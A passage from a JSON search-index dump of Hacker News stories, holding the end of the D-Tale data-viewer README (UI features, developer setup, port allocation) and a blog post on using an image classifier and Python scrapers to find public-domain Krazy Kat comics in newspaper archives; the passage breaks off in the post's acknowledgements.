columns are no longer lining up. Click this and should fix that Theme Toggle between light & dark themes for your viewing pleasure (only affects grid, not popups or charts). Light Dark Reload Data Force a reload of the data from the server for the current rows being viewing in the grid by clicking this button. This can be helpful when viewing the grid from within another application like jupyter or nested within another website. Unpin/Pin Menu If you would like to keep your menu pinned to the side of your grid all times rather than always having to click the triaangle in the upper left-hand corner simply click this button. It is persisted back to the server so that it can be applied to all piece of data you've loaded into your session and beyond refreshes. Language I am happy to announce that D-Tale now supports both English & Chinese (there is still more of the translation to be completed but the infrastructure is there). And we are happy to add support for any other languages. Please see instruction on how, here. Shutdown Pretty self-explanatory, kills your D-Tale session (there is also an auto-kill process that will kill your D-Tale after an hour of inactivity) Column Menu Functions Filtering These interactive filters come in 3 different types: String, Numeric & Date. Note that you will still have the ability to apply custom filters from the \"Filter\" popup on the main menu, but it will get applied in addition to any column filters. Type Filter Data Types Features String strings & booleans The ability to select multiple values based on what exists in the column. Notice the \"Show Missing Only\" toggle, this will only show up if your column has nan values Date dates Specify a range of dates to filter on based on start & end inputs Numeric ints & floats For integers the \"=\" will be similar to strings where you can select multiple values based on what exists in the column. You also have access to other operands: <,>,<=,>=,() - \"Range exclusve\", [] - \"Range inclusive\". Moving Columns All column movements are saved on the server so refreshing your browser won't lose them Hiding Columns All column movements are saved on the server so refreshing your browser won't lose them Delete As simple as it sounds, click this button to delete this column from your dataframe. Rename Update the name of any column in your dataframe to a name that is not currently in use by your dataframe. Replacements This feature allows users to replace content on their column directly or for safer purposes in a brand new column. Here are the options you have: Type Data Types Description Menu Value(s) all Replace specific values in a column with raw values, output from another column or an aggregation on your column Spaces Only strings Replace string values consisting only of spaces with raw values Contains Char/Substring strings Replace string values containing a specific character or substring Scikit-Learn Imputer numeric Replace missing values with the output of using different Scikit-Learn imputers like iterative, knn & simple Here's a quick demo: Lock Adds your column to \"locked\" columns \"locked\" means that if you scroll horizontally these columns will stay pinned to the right-hand side this is handy when you want to keep track of which date or security_id you're looking at by default, any index columns on the data passed to D-Tale will be locked Unlock Removed column from \"locked\" columns Sorting Applies/removes sorting (Ascending/Descending/Clear) to the column selected Important: as you add sorts they sort added will be added to the end of the multi-sort. For example: Action Sort click \"a\" sort asc a (asc) click \"b\" a (asc) sort desc a (asc), b(desc) click \"a\" a (asc), b(desc) sort None b(desc) sort desc b(desc), a(desc) click \"X\" on sort display Formats Apply simple formats to numeric values in your grid Type Editing Result Numeric Date String For all data types you have the ability to change what string is ued for display. For numbers here's a grid of all the formats available with -123456.789 as input: Format Output Precision (6) -123456.789000 Thousands Sep -123,456.789 Abbreviate -123k Exponent -1e+5 BPS -1234567890BPS Red Negatives -123457 For strings you can apply the follwoing formats: Truncation: truncate long strings to a certain number of characters and replace with an allipses \"...\" and see the whole value on hover. Hyperlinks: If your column is comprised of URL strings you can make them hyperlinks which will open a new tab Describe (Column Analysis) Based on the data type of a column different charts will be shown. This side panel can be closed using the 'X' button in the upper right or by pressing the ESC key. Chart Data Types Sample Box Plot Float, Int, Date Histogram Float, Int Value Counts Int, String, Bool, Date, Category Word Value Counts String Category Float Geolocation* Int, Float Q-Q Plot Int, Float, Date Histogram can be displayed in any number of bins (default: 20), simply type a new integer value in the bins input Value Count by default, show the top 100 values ranked by frequency. If you would like to show the least frequent values simply make your number negative (-10 => 10 least frequent value) Value Count w/ Ordinal you can also apply an ordinal to your Value Count chart by selecting a column (of type int or float) and applying an aggregation (default: sum) to it (sum, mean, etc...) this column will be grouped by the column you're analyzing and the value produced by the aggregation will be used to sort your bars and also displayed in a line. Here's an example: Word Value Count you can analyze string data by splitting each record by spaces to see the counts of each word. This chart has all the same functions available as \"Value Counts\". In addition, you can select multiple \"Cleaner\" functions to be applied to your column before building word values. These functions will perform operations like removing punctuation, removing numeric character & normalizing accent characters. Category (Category Breakdown) when viewing float columns you can also see them broken down by a categorical column (string, date, int, etc...). This means that when you select a category column this will then display the frequency of each category in a line as well as bars based on the float column you're analyzing grouped by that category and computed by your aggregation (default: mean). Geolocation when your data contains latitude & longitude then you can view the coverage in a plotly scattergeo map. In order to have access this chart your dataframe must have at least one of each of these types of columns: \"lat\" must be contained within the lower-cased version of the column name and values be between -90 & 90 \"lon\" must be contained within the lower-cased version of the column name and values be between -180 & 180 Hotkeys These are key combinations you can use in place of clicking actual buttons to save a little time: Keymap Action shift+m Opens main menu* shift+d Opens \"Describe\" page* shift+f Opens \"Custom Filter\"* shift+b Opens \"Build Column\"* shift+c Opens \"Charts\" page* shift+x Opens \"Code Export\"* esc Closes any open modal window or side panel & exits cell editing * Does not fire if user is actively editing a cell. Menu Functions Depending on Browser Dimensions Depending on the dimensions of your browser window the following buttons will not open modals, but rather separate browser windows: Correlations, Describe & Instances (see images from Jupyter Notebook, also Charts will always open in a separate browser window) For Developers Cloning Clone the code (git clone ssh://git@github.com:manahl/dtale.git), then start the backend server: $ git clone ssh://git@github.com:manahl/dtale.git # install the dependencies $ python setup.py develop # start the server $ python dtale --csv-path /home/jdoe/my_csv.csv --csv-parse_dates date You can also run dtale from PyDev directly. You will also want to import javascript dependencies and build the source: $ npm install # 1) a persistent server that serves the latest JS: $ npm run watch # 2) or one-off build: $ npm run build Running tests The usual npm test command works: You can run individual test files: $ TEST=static/__tests__/dtale/DataViewer-base-test.jsx npm run test-file Linting You can lint all the JS and CSS to confirm there's nothing obviously wrong with it: You can also lint individual JS files: $ npm run lint-js-file -s -- static/dtale/DataViewer.jsx Formatting JS You can auto-format code as follows: Docker Development You can build python 27-3 & run D-Tale as follows: $ yarn run build $ docker-compose build dtale_2_7 $ docker run -it --network host dtale_2_7:latest $ python >>> import pandas as pd >>> df = pd.DataFrame([dict(a=1,b=2,c=3)]) >>> import dtale >>> dtale.show(df) Then view your D-Tale instance in your browser using the link that gets printed You can build python 36-1 & run D-Tale as follows: $ yarn run build $ docker-compose build dtale_3_6 $ docker run -it --network host dtale_3_6:latest $ python >>> import pandas as pd >>> df = pd.DataFrame([dict(a=1,b=2,c=3)]) >>> import dtale >>> dtale.show(df) Then view your D-Tale instance in your browser using the link that gets printed Adding Language Support Currently D-Tale support both english & chinese but other languages will gladly be supported. To add another language simply open a pull request with the following: cake a copy & translate the values in the following JSON english JSON files and save them to the same locations as each file Back-End Front-End please make the name of these files the name of the language you are adding (currently english -> en, chinese -> cn) be sure to keep the keys in english, that is important Looking forward to what languages come next! Global State/Data Storage If D-Tale is running in an environment with multiple python processes (ex: on a web server running gunicorn) it will most likely encounter issues with inconsistent state. Developers can fix this by configuring the system D-Tale uses for storing data. Detailed documentation is available here: Data Storage and managing Global State Startup Behavior Here's a little background on how the dtale.show() function works: by default it will look for ports between 40000 & 49000, but you can change that range by specifying the environment variables DTALE_MIN_PORT & DTALE_MAX_PORT think of sessions as python consoles or jupyter notebooks Session 1 executes dtale.show(df) our state is: Session Port Active Data IDs URL(s) 1 40000 1 http://localhost:40000/dtale/main/1 Session 1 executes dtale.show(df) our state is: Session Port Active Data IDs URL(s) 1 40000 1,2 http://localhost:40000/dtale/main/[1,2] Session 2 executes dtale.show(df) our state is: Session Port Active Data IDs URL(s) 1 40000 1,2 http://localhost:40000/dtale/main/[1,2] 2 40001 1 http://localhost:40001/dtale/main/1 Session 1 executes dtale.show(df, port=40001, force=True) our state is: Session Port Active Data IDs URL(s) 1 40001 1,2,3 http://localhost:40001/dtale/main/[1,2,3] Session 3 executes dtale.show(df) our state is: Session Port Active Data IDs URL(s) 1 40001 1,2,3 http://localhost:40001/dtale/main/[1,2,3] 3 40000 1 http://localhost:40000/dtale/main/1 Session 2 executes dtale.show(df) our state is: Session Port Active Data IDs URL(s) 1 40001 1,2,3 http://localhost:40001/dtale/main/[1,2,3] 3 40000 1 http://localhost:40000/dtale/main/1 2 40002 1 http://localhost:40002/dtale/main/1 Session 4 executes dtale.show(df, port=8080) our state is: Session Port Active Data IDs URL(s) 1 40001 1,2,3 http://localhost:40001/dtale/main/[1,2,3] 3 40000 1 http://localhost:40000/dtale/main/1 2 40002 1 http://localhost:40002/dtale/main/1 4 8080 1 http://localhost:8080/dtale/main/1 Session 1 executes dtale.get_instance(1).kill() our state is: Session Port Active Data IDs URL(s) 1 40001 2,3 http://localhost:40001/dtale/main/[2,3] 3 40000 1 http://localhost:40000/dtale/main/1 2 40002 1 http://localhost:40002/dtale/main/1 4 8080 1 http://localhost:8080/dtale/main/1 Session 5 sets DTALE_MIN_RANGE to 30000 and DTALE_MAX_RANGE 39000 and executes dtale.show(df) our state is: Session Port Active Data ID(s) URL(s) 1 40001 2,3 http://localhost:40001/dtale/main/[2,3] 3 40000 1 http://localhost:40000/dtale/main/1 2 40002 1 http://localhost:40002/dtale/main/1 4 8080 1 http://localhost:8080/dtale/main/1 5 30000 1 http://localhost:30000/dtale/main/1 Documentation Have a look at the detailed documentation. Dependencies Back-end dash dash_daq Flask Flask-Compress flask-ngrok Pandas plotly scikit-learn scipy xarray arctic [extra] redis [extra] rpy2 [extra] Front-end react-virtualized chart.js Acknowledgements D-Tale has been under active development at Man Numeric since 2019. Original concept and implementation: Andrew Schonfeld Contributors: Phillip Dupuis Fernando Saravia Rajal Dominik Christ Reza Moshksar Bertrand Nouvel Chris Boddy Jason Holden Tom Taylor Wilfred Hughes Mike Kelly Vincent Riemer Youssef Habchi - title font ... and many others ... Contributions welcome! License D-Tale is licensed under the GNU LGPL v2.1. A copy of which is included in LICENSE ",
        "_version_": 1718527444075413504
      },
      {
        "story_id": [20307005],
        "story_author": ["jf"],
        "story_descendants": [15],
        "story_score": [135],
        "story_time": ["2019-06-28T17:52:55Z"],
        "story_title": "I used ML to find public domain Krazy Kat comics in newspaper archives",
        "search": [
          "I used ML to find public domain Krazy Kat comics in newspaper archives",
          "https://joel.franusic.com/krazy_kat/about/",
          "Summary This page goes into detail on how I used Machine Learning to find hundreds of Krazy Kat comics that are now in the public domain. As a result of this project, several hundred high resolution scans of Krazy Kat comics are now easily available online, including a comic that I couldn't find in any published book! What follows is a detailed description of what I did to find these comics in online newspaper archives. About After becoming a little obsessed with Krazy Kat, I was very disappointed to see many of the books I wanted were incredibly expensive. For example \"Krazy & Ignatz: The Complete Sunday Strips 1916-1924\" was selling on Amazon for nearly $600 and \"Krazy & Ignatz 1922-1924: At Last My Drim Of Love Has Come True\" was selling for nearly $90. At some point, I realized that the copyright for many of the comics that I was looking for has expired and that these public domain comics were likely available in online newspaper archives. So, driven a desire to obtain the \"unobtainable\" and mostly by curiosity to see if it was possible, I set out to see if I could find public domain Krazy Kat Sunday comics in online newspaper archives. As you can see in the \"Comics\" section of this site, it is possible to find Krazy Kat comics in online newspaper archives and I've made all of the comics I could find viewable on this web page. If all you want to do is read Krazy Kat comics, I encourage you to click on the \"Comics\" link above. I hope that by being able to read the comics online, you'll be inspired to buy one of the reprints from Fantagraphics. Krazy Kat is best appreciated in the medium it was designed for and the books that Fantagraphics publishes are a delight. You can find the books that I recommend in the \"Buy\" section of this site. What follows below is a detailed description of the code I wrote to find the Krazy Kat comics in newspaper archives. I also wrote my recommendations for curators of newspaper archives, as well as my advice for for people who want to build upon, or replicate, my work. Finally, I close with a long list of things that I wish I could have done, in the hope that someone else will be inspired to do them. How to find Krazy Kat comics in newspaper archives In short, I wrote some programs in Python that downloaded thumbnails from various newspaper archives, manually found about 100 Sunday comic strips from the thumbnails, used Microsoft's Custom Vision service to train an image classifier to detect Krazy Kat comics in thumbnail images, used that classifier to find several hundred more thumbnails, then wrote some more code in Python to download high resolution images of all of the thumbnails that I found. This was done in several stages: Learning about Krazy Kat Discussing feasibility of the project with an ML expert Searching for archives that contain Krazy Kat Sunday comics Writing code to download thumbnails from newspaper archives Training an image classifier Using the image classifier to find more thumbnails Writing code to download full size images Finding comics in other online archives I go into detail on each of those stages in the sections below: Learning about Krazy Kat If it were not for a chance encounter with Krazy Kat and The Art of George Herriman at Pegasus Books I wouldn't be familiar with the series myself. The reason I picked up the book in the first place is because the comic strip Calvin and Hobbes was such a big part of my childhood, and I remembered how Bill Watterson referenced Krazy Kat as a big reason why he insisted on getting a larger full color format for his Sunday comic strips. Once I finished reading \"Krazy Kat and The Art of George Herriman\" I started to buy the fantastic books from Fantagraphics. However, as stated above, I felt frustrated that some of the books so expensive. Discussing feasibility of the project with an ML expert The real genesis of this project however, was a conversation I had with Tyler Neylon about one of the projects he was working on at Unbox Research a machine learning research & development company. Speaking with Tyler got me thinking about the types of projects I could use machine learning with, and the idea of using machine learning to help me find Krazy Kat images was the most interesting of the things that we discussed. Searching for archives that contain Krazy Kat Sunday comics Before I could get started with machine learning, I had to see if the idea was feasible at all, were there any newspaper archives online that had Krazy Kat comics? Many of the newspapers that I initially checked didn't have any trace of Krazy Kat. I was starting to get worried until I found the archive of the Chicago Examiner (1908-1918) that the Chicago Public Library keeps online. This was exciting! It's fortunate that I found the Chicago Examiner archive as soon as I did, because it turns out that it's not very easy to find newspapers with Krazy Kat Sunday comics in them! After many hours of frustrating research, I was finally able to narrow determine that Krazy Kat Sunday comics are available from the following sources: Sunday comics: The Chicago Examiner via the Chicago Public Library The Washington Times via the excellent \"Chronicling America\" archive at the Library of Congress Newspapers.com HA.com In the process of looking for Sunday comics, I was also able to find several newspapers in various archives that also have copies of the daily Krazy Kat comics. However, given a self-imposed deadline I set for myself, I didn't have the time to do anything other than make a list of newspapers that have the dailies. Below is a list of newspaper archives and the year that I was able to find daily Krazy Kat comics: Daily comics: The St. Louis Star and Times (1913) The Oregon Daily Journal (1914) The Lincoln Star (1919) El Paso Herald (1919) The San Francisco Examiner (1920) Salt Lake Telegram (1920) The Pittsburgh Press (1920) The Minneapolis Star (1920) The Lincoln Star (1920) Writing code to download thumbnails from newspaper archives Once I had sources for newspaper scans, my next step was to download thumbnails from the archives I found. The main reason to use thumbnails over full sized images is that the average size of a thumbnail is about 4KiB while the size of a full resolution scan can be nearly 7 MiB! I was also very curious if I could detect Krazy Kat comics using only thumbnails. In general, my specific goal for each of the newspaper archives was to download as many thumbnails as I could from Sunday editions published before 1923 (as of 2019, works published before 1923 are in the public domain) Some of the newspaper archives had better APIs for finding and fetching images than others. Surprisingly, the internal API that Newspapers.com uses for their archives was the easiest to use. I ended up writing several different Python scripts to download each thumbnail collection individually. After seeing the similarities between them, I decided to put all the logic together into a single Python package called \"krazy.py\" using this package, we can get a list of all thumbnails from known newspaper archives with code like this: import krazy proxies = { 'http': 'http://localhost:3030', } This code has two parts. The first part handles registering of the different \"Finders\" that I implemented, which know how to find Sunday pages: finder = krazy.Finder(proxies=proxies) finder.add(krazy.NewspapersCom) finder.add(krazy.LocGov) finder.add(krazy.ChipublibOrg) And the second part will query all registered \"Finders\" for their Sunday pages, using the .sunday-pages() method: for page in finder.sunday_pages(): print('get-thumbnails.py {}'.format(page)) print(\"\\t thumbnail {}\".format(page.thumbnail)) print(\"\\t suggested {}\".format(page.suggested_name)) print(\"\\t full name {}\".format(page.full_size)) This code in turn will call the \"Finders\" for the Newspapers.com, Library of Congress, and Chicago Public Library archives. All of these classes implement the base \"Source\" class, which contains some syntactic sugar that makes working with all of the different finders a little easier. One thing to note is that these classes are written to make it easy to convert between the URL for a full size image full_size, the URL for the corresponding thumbnail image thumbnail, and the suggested local filename for that same image suggested_name. Here's what all the code above looks like in a single file: import krazy proxies = { 'http': 'http://localhost:3030', } finder = krazy.Finder(proxies=proxies) finder.add(krazy.NewspapersCom) finder.add(krazy.LocGov) finder.add(krazy.ChipublibOrg) for page in finder.sunday_pages(): print('get-thumbnails.py {}'.format(page)) print(\"\\t thumbnail {}\".format(page.thumbnail)) print(\"\\t suggested {}\".format(page.suggested_name)) print(\"\\t full name {}\".format(page.full_size)) With that in mind, let's start with the code for getting Sunday pages from the Newspapers.com archives. This code was pretty easy to write, I calculate all the dates that have Sundays, then query the Newspapers.com API for the pages for that date. class NewspapersCom(Source): source_id = 'newspapers.com' url_template = 'https://www.newspapers.com/download/image/?type=jpg&id={id}' @property def _sundays(self): start_day = '1916-04-23' end_year = 1924 date = datetime.datetime.strptime(start_day, '%Y-%m-%d') sundays = [] while date.year < end_year: if date.strftime('%A') == 'Sunday': yield date date += datetime.timedelta(days=7) def sunday_pages(self): urls = [ 'http://www.newspapers.com/api/browse/1/US/California/San%20Francisco/The%20San%20Francisco%20Examiner_9317', 'http://www.newspapers.com/api/browse/1/US/District%20of%20Columbia/Washington/The%20Washington%20Times_1607' ] for url in urls: for day in self._sundays: day_path = day.strftime('/%Y/%m/%d') rv = self.session.get(url + day_path).json() if 'children' not in rv: continue for page in rv['children']: self._parts = [ self.source_id, day.strftime('%Y'), day.strftime('%m'), day.strftime('%d'), 'id', page['name'] ] yield self This is the code for getting Sunday pages from the Library of Congress archives. In this case, I actually take advantage of a search query for \"krazy kat\" and return all of those pages. I did this because the Library of Congress archive was what I first started with. If I wrote this again, I'd implement it without a search. class LocGov(Source): source_id = 'chroniclingamerica.loc.gov' file_suffix = '.jp2' _base_url = 'http://' + source_id from_page_template = _base_url + '/lccn/{lccn}/{date}/ed-{ed}/seq-{seq}' _search_url = _base_url + '/search/pages/results/' url_template = from_page_template + file_suffix def sunday_pages(self): search_payload = { 'date1': '1913', 'date2': '1944', 'proxdistance': '5', 'proxtext': 'krazy+herriman', 'sort': 'relevance', 'format': 'json' } results_seen = 0 page = 1 urls = [] while True: search_payload['page'] = str(page) # print('Fetching page {}'.format(page)) result = self.session.get(self._search_url, params=search_payload).json() for item in result['items']: results_seen += 1 url = item['url'] if url: yield self._bootstrap_from_url(item['url']) if(results_seen < result['totalItems']): page += 1 else: # print('Found {} items'.format(results_seen)) break And finally, here is the code for getting Sunday pages from the Chicago Public Library archives. As you can see, this is pretty involved. The supporting cast in this object are the _url method, which creates URLs for the Chicago Public Library API, and the _bootstrap_from_url method, which creates an instance of a ChipublibOrg object. _url and _bootstrap_from_url are then used by the sunday_pages method to return objects representing Sunday pages from the Chicago Public Library archive. class ChipublibOrg(Source): source_id = 'digital.chipublib.org' _base_url = 'http://' + source_id _full_size_url = _base_url + '/digital/download/collection/examiner/id/{id}/size/full' _thumbnail_url = _base_url + '/digital/api/singleitem/collection/examiner/id/{id}/thumbnail' _info_url = _base_url + '/digital/api/collections/{collection}/items/{id}/false' url_template = _full_size_url _chipublib_defaults = [ ('collection', 'examiner'), ('order', 'date'), ('ad', 'dec'), ('page', '1'), ('maxRecords', '100'), ] def _url(self, **inputs): options = OrderedDict(self._chipublib_defaults) for key in inputs: if key in options: value = inputs[key] if isinstance(value, int): value = str(value) options[key] = value path = '/'.join(itertools.chain.from_iterable(options.items())) search_url = 'http://{source_id}/digital/api/search/{path}'.format(source_id=self.source_id, path=path) return search_url def _bootstrap_from_id(self, item_id): defaults = dict(self._chipublib_defaults) values = {'id': item_id, 'collection': defaults['collection']} url = self._info_url.format(**values) # print('url: ' + url) result = self.session.get(url).json() fields = dict([(field['key'], field['value']) for field in result['fields']]) for child in result['parent']['children']: page_number = child['title'].split(' ')[1] # digital.chipublib.org-examiner-1917-12-16-page-34-item-88543 self._parts = [self.source_id, defaults['collection']] self._parts.extend(fields['date'].split(self.sep)) self._parts.extend(['page', str(page_number), 'item', str(child['id'])]) yield self def sunday_pages(self): resultsSeen = 0 page = 1 while True: result = self.session.get(self._url(page=page)).json() for record in result['items']: resultsSeen += 1 metadata = dict([(item['field'], item['value']) for item in record['metadataFields']]) record_date = datetime.datetime.strptime(metadata['date'], '%Y-%m-%d') # Krazy Kat ... a comic strip by cartoonist George Herriman, ... ran from 1913 to 1944. if record_date.year < 1913: continue if record_date.strftime('%A') != 'Sunday': continue item_id = record['itemId'] for page in self._bootstrap_from_id(item_id): yield page if(resultsSeen < result['totalResults']): page += 1 else: break Visually confirming images Once I was able to get a list of thumbnail image URLs, I wrote a script to download each of those thumbnails into a local file named using the suggested_name() for each thumbnail. For example, this URL: http://digital.chipublib.org/digital/api/singleitem/collection/examiner/id/88888/thumbnail would be saved as this file: digital.chipublib.org-examiner-1917-12-30-page-31-item-88888.jpeg At this point, I had a folder full of thumbnail images, that looked something like this: Using Finder in macOS, I scanned over each image personally. When I found a thumbnail that looked like it contained Krazy Kat, I'd use the identifier in the filename to load up the full sized image. For example, if I thought that this thumbnail contained Krazy Kat: Then I would take the identifier from that filename (in this case \"88888\") and use that to load up the full sized image, which in this example would be this URL: http://digital.chipublib.org/digital/collection/examiner/id/88888 If the thumbnail did turn out to contain a Krazy Kat comic, then I'd tag the file in Finder. In my case, I tagged thumbnails for Krazy Kat comics with \"Green\", but the color doesn't matter. After tagging about 100 images, I was ready to learn to train a custom \"image classifier\" that I could use to find even more Krazy Kat comics for me. Training an image classifier Initially, my plan was to use this project as an excuse to learn to use TensorFlow. However, after about 4 frustrating hours of trying to get TensorFlow, Karas, or PyTorch running, I just gave up. Most frustrating of all was Illegal instruction: 4 error message that I kept getting from TensorFlow. Apparently the Mac I use at home is too old for modern versions of TensorFlow? In any event, thanks to a suggestion from my friend Timothy Fitz, who suggested that I use Google's Auto ML. I realized that I could use a cloud service to train an image classifier instead. With that in mind, I decided to give Microsoft's Custom Vision service instead. In short, Custom Vision is a wonderful service. It was easy to use and gave me exactly what I wanted. All I had to do to build an image classifier with Custom Vision was to upload the 100 or so thumbnails that I found with Krazy Kat sunday comics in them, tag those images \"krazy\" and then upload about 100 images that did not have Krazy Kat in them. To get the thumbnails I found with Krazy Kat, I simply made a \"Smart Folder\" in macOS that contained all images tagged \"Green\" I simply selected all of the images from the Smart Folder and dragged them into Custom Vision to upload them. After tagging those images as \"krazy\" I repeated the process to upload thumbnails that didn't have Krazy Kat and tagged those as \"Negative\" After that, I spent some time playing with Custom Vision, working on improving the rate at which it correctly recognized thumbnails with Krazy Kat. An interesting part of this exercise is that I ended up feeling like I was doing \"meta-programming\" rather than looking for patterns myself, I just spent more time finding thumbnails that appeared to have Krazy Kat, but didn't. One word of warning, using the \"Advanced Training\" option costs money and it's not clear how much the training will cost. I ended up spending just over $180 on Advanced Training before I realized how much I had spent! Using the image classifier to find candidates in Library of Congress archive Once I was fairly confidant with the image classification model that Custom Vision made, it was time to test it out in the real world. Initially, I had hoped to use Custom Vision's ability to export TensorFlow models so I could run image classification locally on my computer. My main concern was that I didn't want to upload each thumbnail to Custom Vision. However, given how much trouble I had getting TensorFlow working, I decided to use Custom Vision's API directly. I was very pleased to learn that the API could take the URL for an image as an option, meaning that I could have Custom Vision fetch the thumbnails directly from the newspaper fetch! I wrote two \"one off\" scripts to make use of the Custom Vision API: ms-predict.py This was the first script I wrote, which uploaded thumbnails to the Custom Vision API. It's pretty simple and proved to me that it the API worked. custom-vision-find-kats-loc.py This was the second script I wrote. I also implemented the Custom Vision API because somehow I missed that they already had a Python library. In any event, this script sent URLs to the Custom Vision API Using a combination of both of these scripts, I was able to find about another couple of hundred thumbnails for Krazy Kat Sunday comics. Writing code to download full size images Thanks to the Custom Vision API, I finally had several hundred thumbnails on my computer. All of these thumbnails were tagged \"Green\" and had unique names that I could use to find their corresponding full size image. Because they were all tagged \"Green\", I could use the mdfind command in macOS to get a list of all the thumbnails I'd found. This is the command I used to get all of the tagged thumbnails: mdfind \"kMDItemUserTags == Green\" And here is an example of what the output looked like: $ mdfind \"kMDItemUserTags == Green\" ... ~/Projects/krazykat/fetch-kats/manual.thumbnails/chroniclingamerica.loc.gov-lccn-sn84026749-1922-12-31-ed-1-seq-49.jpeg ~/Projects/krazykat/fetch-kats/manual.thumbnails/chroniclingamerica.loc.gov-lccn-sn84026749-1922-05-14-ed-1-seq-49.jpeg ~/Projects/krazykat/fetch-kats/manual.thumbnails/chroniclingamerica.loc.gov-lccn-sn84026749-1922-04-16-ed-1-seq-50.jpeg ~/Projects/krazykat/fetch-kats/manual.thumbnails/chroniclingamerica.loc.gov-lccn-sn84026749-1922-03-05-ed-1-seq-50.jpeg ~/Projects/krazykat/fetch-kats/manual.thumbnails/chroniclingamerica.loc.gov-lccn-sn84026749-1922-02-12-ed-1-seq-29.jpeg ~/Projects/krazykat/fetch-kats/manual.thumbnails/chroniclingamerica.loc.gov-lccn-sn84026749-1922-01-29-ed-1-seq-27.jpeg ~/Projects/krazykat/fetch-kats/manual.thumbnails/digital.chipublib.org-examiner-1917-04-01-page-38-item-83144.jpeg ~/Projects/krazykat/fetch-kats/manual.thumbnails/digital.chipublib.org-examiner-1916-06-04-page-49-item-81637.jpeg ~/Projects/krazykat/fetch-kats/manual.thumbnails/digital.chipublib.org-examiner-1916-06-11-page-47-item-81884.jpeg ~/Projects/krazykat/fetch-kats/manual.thumbnails/digital.chipublib.org-examiner-1916-07-02-page-32-item-85927.jpeg ~/Projects/krazykat/fetch-kats/manual.thumbnails/digital.chipublib.org-examiner-1916-10-15-page-40-item-93726.jpeg ~/Projects/krazykat/fetch-kats/manual.thumbnails/digital.chipublib.org-examiner-1916-10-29-page-44-item-94073.jpeg ~/Projects/krazykat/fetch-kats/manual.thumbnails/digital.chipublib.org-examiner-1917-02-11-page-31-item-89081.jpeg ... With a list of thumbnails to download, I used some code similar to the code below to take in a list of thumbnails and, using their names, determine the URL for the full size image and then download the full sized image: import fileinput import krazy finder = krazy.Finder() finder.add(krazy.LocGov) # finder.add(NewspapersCom) finder.add(krazy.ChipublibOrg) for line in fileinput.input(): print(line) img = finder.identify(line) if not img: continue if img.source_id is 'newspapers.com': img.headers = newspapers_headers img.cookies = newspapers_cookies # print(img.full_size) finder.download(img) This code looks simple because most of the logic is hidden in the krazy Python library that I wrote to abstract out the details. Figuring out dates for comics Once I had several hundred comics on my computer, my next task was to start collecting them together. In the early days of Krazy Kat, the dates on which comics were published was very erratic. I considered several approaches to identifying each comic: made up names, names that have to do with the contents of the comic, \"perceptual hashing\", and so on. Eventually I just decided to use the dates that Fantagraphics used in their books. Overall, this approach worked quite well. With one exception! One of the comics that I found, published on 1922-01-29, was not in any of the Fantagraphics books I looked in! I'm not sure why this is the case, but I suspect that the archive from which Fantagraphics used somehow didn't have this comic? I hope that someone will figure out the reason why I couldn't find the comic and let me know! Finding comics in other online archives Whew! At this point, I had a lot of Krazy Kat comics, but I still had a sneaking suspicion that I had somehow missed some Krazy Kat comics that were already online. Well, it turns out that my suspicions were well founded, because I found comics in three other sources: Wikipedia, which hosts quite a few comics in the Wikimedia Commons The Comic Strip Library, which has scans from books Heritage Auctions, which has high resolution scans of original Krazy Kat artwork From what I could tell, the Wikimedia Commons only had comics which were available elsewhere, so I skipped those. That said, I did put an effort into getting images from The Comic Strip Library and Heritage Auctions and included those images in the comic viewer on this site. I enjoy finding days where the same comic is available from several sources, since it's interesting to see how the comic changes when printed in different ways. Suggestions for future work I gave myself a month to complete this project, so I didn't investigate many of the interesting side-paths that appeared as I explored the world of comics in newspapers archives. Since you, dear reader, have made it this far through this page, then I'm assuming that you're interested enough in the work I did to maybe build upon it? If you are indeed interested in working on a project in this space, here is a list of things I would have liked to have done, but didn't have time to do: Things I wish I could have done Train an image classifier to recognize the comic boundaries I included the full newspaper scans on this site because I didn't want to crop all of those images by hand, and also because that's a job that a good image classifier could do automatically? Train an image classifier that can find all types of comics I was only interested in Krazy Kat comics that were published on Sunday. In the process of manually looking through the archives, I ran across many other interesting comics that I would have liked to have extracted too. The Katzenjammer Kids and Winsor McCay's comics in particular. Train an image classifier that can find the daily Krazy Kat comics From what I can tell, most of the daily Krazy Kat comics haven't been published. Doing this would allow the world to see thousands of new Krazy Kat comics. Investigate approaches to automatically restore comics Given that we have scans of original artwork available, as well as the ability to pull the same comic from several archives, doing automatic comic restoration seems like an approach that's worth investigating. Here are some of the approaches that I would have liked to have looked into myself: Write code to detect and correct stippling When you compare an original Krazy Kat print with what was published in a newspaper, you can see that George Herriman scribbled in areas where he wanted the newspapers to insert stippling. In the published comics, you can see that the scans of the comics have stippling that has been smudged or distorted. It should be possible to train a machine learning model to recognize stippling and correct any errant stipples that it finds. Try and build a Machine Learning model that could synthesize original sketches Given how many original prints are available online, it might be possible to use Machine Learning to \"dream up\" what the original drawing for a comic might have looked like. If this approach worked, it would mean that we could have much higher quality prints of comics. Color and contrast correction All of the scans have different contrast levels, all of them have different shades of white. It would have been nice to automatically correct contrast and color on the scans. Build a Krazy Kat API I would have liked to have made an API like The Star Wars API or the PokeAPI for Krazy Kat. I would have liked this API to have a list of all known comics, links to newspaper archives that held those comics, a list of who shows up in each comic, the text to the comics, and so on Make the image viewer a SPA It would have been cool to make the comic viewer a \"Single Page App\" that used a Krazy Kat API Figure out why the dates that Krazy Kat comics were published on are so erratic It would have been nice to have done some more in-depth analysis into why various newspapers published Krazy Kat comics on different dates. Make Krazy Kat comics in the public domain available in other formats If I had a way to automatically correct the color and contrast in comics, as well as have them automatically cropped, I would have also liked to have converted the comics to other formats, for example: Comic book archive PDF Kindle Recommendations for newspaper archivists If you work for a newspaper archive, here is my wish list for what I would have loved to have had in some or all of the newspaper archives I worked with: An easy way to search for specific days of the week (Sunday in particular) A clearer way to get thumbnails for pages. In particular, I would have loved to be able to download an entire collection of thumbnails at once. Use .jp2 It's JPEG with metadata. Why isn't everybody using this? Make better quality thumbnails If the quality of a thumbnail image is high enough, you don't need to fetch any additional images. For what it's worth, of all the thumbnails that I saw, those from the Chicago Public Library's archive of the Chicago Examiner were the best. Advice for building upon my work If you're inspired by this work and want to build upon it, here is my high level advice: I kept a log with more detailed notes on what I did. Email me and I'll send it to you! Try not to piss off archivists, use caching and thumbnails! Use file tagging to make your life easier I'm happy to share the training data I used with you, just ask! Thanks This project would have been a lot more difficult without the help from the following people and institutions: Tyler Neylon at Unbox Research for the inspiration Tanner Gilligan for advice on the feasibility of using thumbnails as well as advice on how many thumbnails I'd likely need to train a classifier. Timothy Fitz for the idea to use Google AutoML Vision Classification (which inspired me to try that approach and use Microsoft's Custom Vision product instead) The team behind Microsoft's Custom Vision product for building a great tool! Kenneth Reitz for 